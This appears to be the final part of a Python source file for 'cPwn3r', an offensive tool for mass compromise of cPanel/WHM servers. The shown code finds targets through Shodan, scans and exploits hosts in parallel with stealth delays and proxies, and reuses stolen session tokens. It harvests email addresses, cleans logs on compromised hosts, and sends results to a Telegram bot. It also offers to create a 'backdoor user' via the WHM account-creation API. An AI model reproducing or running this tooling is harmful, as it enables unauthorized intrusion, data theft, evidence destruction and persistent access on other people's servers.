        choice = input("Select setting to change (1-10): ").strip()
        if choice == '1':
            self.config["shodan_api_key"] = input("Enter Shodan API Key: ").strip()
        elif choice == '2':
            self.config["telegram_bot_token"] = input("Enter Telegram Bot Token: ").strip()
            self.telegram.bot_token = self.config["telegram_bot_token"]
        elif choice == '3':
            self.config["telegram_chat_id"] = input("Enter Telegram Chat ID: ").strip()
            self.telegram.chat_id = self.config["telegram_chat_id"]
        elif choice == '4':
            try:
                val = input("Enter Scan Threads (default 50): ").strip()
                self.config["scan_threads"] = int(val) if val else 50
                self.scan_threads = self.config["scan_threads"]
            except:
                print(Fore.RED + "[-] Invalid number.")
        elif choice == '5':
            try:
                val = input("Enter Exploit Threads (default 20): ").strip()
                self.config["exploit_threads"] = int(val) if val else 20
                self.exploit_threads = self.config["exploit_threads"]
            except:
                print(Fore.RED + "[-] Invalid number.")
        elif choice == '6':
            self.config["proxy"] = input("Enter proxy URL (empty to disable): ").strip()
            self.proxy = self.config["proxy"]
        elif choice == '7':
            try:
                val = input("Enter Min Delay (seconds): ").strip()
                self.config["min_delay"] = float(val) if val else 0.5
                self.min_delay = self.config["min_delay"]
            except:
                print(Fore.RED + "[-] Invalid number.")
        elif choice == '8':
            try:
                val = input("Enter Max Delay (seconds): ").strip()
                self.config["max_delay"] = float(val) if val else 3.0
                self.max_delay = self.config["max_delay"]
            except:
                print(Fore.RED + "[-] Invalid number.")
        elif choice == '9':
            current = self.config.get("stealth_mode", False)
            self.config["stealth_mode"] = not current
            self.stealth_mode = self.config["stealth_mode"]
            print(Fore.GREEN + f"[+] Stealth mode set to {self.stealth_mode}")
        elif choice == '10':
            save_config(self.config)
            print(Fore.GREEN + "[+] Configuration saved.")
        else:
            print(Fore.RED + "[-] Invalid option.")

    def _load_targets(self):
        filepath = input("Enter target file path: ").strip()
        if not os.path.exists(filepath):
            print(Fore.RED + f"[-] File {filepath} not found.")
            return
        with open(filepath, 'r') as f:
            lines = f.read().strip().splitlines()
        count = 0
        seen = set()
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '://' in line:
                line = line.split('://')[1]
            if '/' in line:
                line = line.split('/')[0]
            try:
                if ':' in line:
                    host, port_str = line.split(':', 1)
                    port = int(port_str)
                    key = (host, port)
                else:
                    host = line
                    port = None
                    key = (host, None)
                if key in seen:
                    continue
                seen.add(key)
                self.db.add_target(host, port)
                count += 1
            except ValueError:
                print(Fore.RED + f"[-] Skipping invalid line: {line}")
        print(Fore.GREEN + f"[+] Loaded {count} unique targets into database.")

    def _add_target(self):
        target = input("Enter target (IP or domain[:port]): ").strip()
        try:
            if ':' in target:
                host, port_str = target.split(':', 1)
                port = int(port_str)
                self.db.add_target(host, port)
            else:
                self.db.add_target(target)
            print(Fore.GREEN + f"[+] Added {target}")
        except ValueError:
            print(Fore.RED + "[-] Invalid port number.")

    def _shodan_discovery(self):
        if not self.shodan_key:
            self.shodan_key = input("Enter Shodan API key: ").strip()
            self.config["shodan_api_key"] = self.shodan_key
            save_config(self.config)
        scanner = ShodanScanner(self.shodan_key)
        query = input("Enter Shodan search query (default: port:2087 cpanel): ").strip()
        if not query:
            query = "port:2087 cpanel"
        pages = int(input("Enter number of pages to fetch (default: 1): ").strip() or "1")
        results = scanner.search(query, pages)
        for host, port in results:
            self.db.add_target(host, port)
        print(Fore.GREEN + f"[+] Added {len(results)} targets from Shodan.")

    def _scan_targets(self):
        pending = self.db.get_pending_targets()
        if not pending:
            print(Fore.RED + "[-] No pending targets. Load targets first.")
            return
        targets = [f"{host}:{port}" if port else host for _, host, port in pending]
        alive = scan_targets(targets, self.scan_threads, self.min_delay, self.max_delay)
        alive_hosts = set()
        for host, port in alive:
            alive_hosts.add((host, port))
            for tid, db_host, db_port in pending:
                if db_host == host:
                    self.db.update_port(tid, port)
                    self.db.update_scan(tid, "Open", port)
                    break
        for tid, host, port in pending:
            if (host, port) not in alive_hosts and (host, None) not in alive_hosts:
                self.db.update_scan(tid, "Closed")
        print(Fore.GREEN + f"[+] Found {len(alive)} live cPanel hosts.")

    def _exploit_targets(self):
        targets = self.db.get_exploitable_targets()
        if not targets:
            print(Fore.RED + "[-] No targets to exploit. Scan first.")
            return
        sessions = load_sessions()
        filtered = []
        for tid, host, port, token, cookie in targets:
            key = f"{host}:{port}"
            if key in sessions:
                sess_data = sessions[key]
                if validate_session(host, port, sess_data.get('cookie_name', cookie), sess_data.get('token'), self.proxy, self.min_delay, self.max_delay):
                    token = sess_data['token']
                    cookie = sess_data.get('cookie_name')
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie)
                    emails = extract_emails(host, port, cookie, token, self.proxy, self.min_delay, self.max_delay)
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie, emails=emails)
                    print(Fore.GREEN + f"[*] Reused valid session for {host}:{port} ({len(emails)} emails)")
                    continue
                else:
                    del sessions[key]
                    save_sessions(sessions)
            if token and cookie:
                if validate_session(host, port, cookie, token, self.proxy, self.min_delay, self.max_delay):
                    emails = extract_emails(host, port, cookie, token, self.proxy, self.min_delay, self.max_delay)
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie, emails=emails)
                    with self.sessions_lock:
                        sessions[key] = {'token': token, 'cookie_name': cookie, 'timestamp': datetime.now().isoformat()}
                        save_sessions(sessions)
                    print(Fore.GREEN + f"[*] Reused DB session for {host}:{port} ({len(emails)} emails)")
                    continue
            filtered.append((tid, host, port, token, cookie))
        if not filtered:
            print(Fore.GREEN + "[+] All targets already exploited or have valid sessions.")
            return
        print(Fore.BLUE + f"[*] Exploiting {len(filtered)} new targets...")
        max_workers = min(self.exploit_threads, len(filtered))
        results = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {}
            for tid, host, port, _, _ in filtered:
                futures[executor.submit(exploit_cpanel, host, port, self.proxy, self.min_delay, self.max_delay)] = (tid, host, port)
            for future in tqdm(as_completed(futures), total=len(futures), desc="Exploiting", file=sys.stdout):
                tid, host, port = futures[future]
                result = future.result()
                status = result.get('status', 'Cant_Access')
                token = result.get('token')
                cookie_name = result.get('cookie_name')
                version = result.get('version')
                discovered_port = result.get('port', port)
                method = result.get('method', 'Unknown')
                if status == 'Exploited' and token:
                    tqdm.write(Fore.GREEN + f"[+] Exploited {host}:{discovered_port} via {method}")
                    if discovered_port != port:
                        self.db.update_port(tid, discovered_port)
                    key = f"{host}:{discovered_port}"
                    with self.sessions_lock:
                        sessions[key] = {
                            'token': token,
                            'cookie_name': cookie_name,
                            'version': version,
                            'timestamp': datetime.now().isoformat()
                        }
                        save_sessions(sessions)
                    emails = extract_emails(host, discovered_port, cookie_name, token, self.proxy, self.min_delay, self.max_delay)
                    if emails:
                        tqdm.write(Fore.GREEN + f"[+] Found {len(emails)} emails")
                    self.db.update_exploit(tid, "Exploited", 1, token, cookie_name, version, emails, method)
                    results.append((host, discovered_port, status, emails))
                else:
                    tqdm.write(Fore.RED + f"[-] {host}:{port} - {status}")
                    self.db.update_exploit(tid, status, 0, attempt=method)
        print(Fore.GREEN + f"[+] Exploited {len(results)} hosts.")

    def _clean_logs(self):
        sessions = load_sessions()
        if not sessions:
            print(Fore.RED + "[-] No saved sessions. Exploit first.")
            return
        print(Fore.BLUE + "[*] Cleaning logs for all exploited targets...")
        for key, data in sessions.items():
            host, port_str = key.split(':')
            port = int(port_str)
            token = data.get('token')
            cookie = data.get('cookie_name')
            if not cookie or not token:
                print(Fore.YELLOW + f"[!] Skipping {host} – missing cookie/token")
                continue
            if clean_logs(host, port, cookie, token, self.proxy, self.min_delay, self.max_delay):
                print(Fore.GREEN + f"[+] Logs cleaned for {host}")
            else:
                print(Fore.RED + f"[-] Failed to clean logs for {host}")

    def _export_results(self):
        results = self.db.get_results()
        if not results:
            print(Fore.RED + "[-] No results to export.")
            return
        export_results(results)
        print(Fore.GREEN + "[+] Results exported.")

    def _send_telegram(self):
        results = self.db.get_results()
        if not results:
            print(Fore.RED + "[-] No results to send.")
            return
        msg = "<b>cPwn3r Results</b>\n"
        msg += f"Total targets: {len(results)}\n"
        exploited = [r for r in results if r[3] == 1]
        msg += f"Exploited: {len(exploited)}\n\n"
        temp_file = "telegram_export.txt"
        with open(temp_file, 'w') as f:
            for row in results:
                host, port, status, exploited_flag, emails_json, token, cookie = row
                emails = json.loads(emails_json) if emails_json else []
                f.write(f"{host}:{port} - Exploited: {bool(exploited_flag)}\n")
                if emails:
                    f.write("  Emails:\n")
                    for e in emails:
                        f.write(f"    {e}\n")
                f.write("\n")
        self.telegram.send(msg, document_path=temp_file)
        os.remove(temp_file)

    def _post_exploit(self):
        sessions = load_sessions()
        if not sessions:
            print(Fore.RED + "[-] No saved sessions.")
            return
        print(Fore.BLUE + "[*] Post-exploit actions:")
        for key, data in sessions.items():
            host, port_str = key.split(':')
            port = int(port_str)
            token = data.get('token')
            cookie = data.get('cookie_name')
            if not cookie or not token:
                print(Fore.YELLOW + f"[!] Skipping {host} – missing cookie/token")
                continue
            if port not in WHM_PORTS:
                print(Fore.YELLOW + f"[!] {host} not on WHM port, skipping advanced actions.")
                continue
            scheme = "https"
            base = f"{scheme}://{host}:{port}"
            session = get_session(self.proxy)
            session.cookies.set(cookie, token)
            resp = request_with_retry("GET", f"{base}/json-api/listaccts", session=session, min_delay=self.min_delay, max_delay=self.max_delay)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    accounts = data.get('data', {}).get('acct', [])
                    print(Fore.GREEN + f"[+] Accounts on {host}:")
                    for acct in accounts:
                        print(f"  {acct.get('user')} ({acct.get('domain')})")
                    choice = input(f"Create backdoor user on {host}? (y/n): ").strip().lower()
                    if choice == 'y':
                        username = input("Enter username: ").strip()
                        password = input("Enter password: ").strip()
                        domain = input("Enter domain: ").strip()
                        create_url = f"{base}/json-api/createacct"
                        params = {
                            "username": username,
                            "password": password,
                            "domain": domain,
                            "plan": "default"
                        }
                        resp2 = request_with_retry("GET", create_url, session=session, params=params, min_delay=self.min_delay, max_delay=self.max_delay)
                        if resp2 and resp2.status_code == 200:
                            print(Fore.GREEN + f"[+] Backdoor user {username} created.")
                        else:
                            print(Fore.RED + f"[-] Failed to create backdoor.")
                except Exception as e:
                    print(Fore.RED + f"[-] Error: {e}")
            else:
                print(Fore.RED + f"[-] Could not list accounts for {host}")

if __name__ == "__main__":
    try:
        app = CPwn3rApp()
        app.run()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted by user.")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"Unexpected error: {e}", exc_info=True)
        sys.exit(1)